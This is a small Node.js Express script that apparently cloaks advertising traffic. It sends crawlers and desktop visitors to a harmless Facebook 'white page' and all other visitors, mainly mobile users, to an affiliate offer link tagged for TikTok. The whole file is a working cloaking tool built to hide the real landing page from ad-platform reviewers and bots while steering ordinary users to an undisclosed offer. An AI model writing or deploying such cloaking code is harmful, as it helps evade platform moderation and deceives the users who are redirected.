const express = require("express");
const useragent = require('express-useragent');
const app = express();
app.use(useragent.express());

const OFFER = 'https://ttdomen.top/click?o=2&a=1252&aff_param1=tiktok';

const WHITE_PAGE = 'https://www.facebook.com/';

app.use('*', function (request, response, next) {
    try {
        const userAgent = request.get('user-agent');
        const platform = request.useragent.platform;

        if (userAgent.toString().toLowerCase().includes('bot')
            || platform.toLowerCase().includes('windows')
            || platform.toLowerCase().includes('macintosh')
            || platform.toLowerCase().includes('linux')
        ) {
            response.redirect(WHITE_PAGE);
        }
        else {
            response.redirect(OFFER);
        }

    } catch (e) {
        console.log(e);
        response.redirect(WHITE_PAGE);
        next(e);
    }
});

app.listen(8080);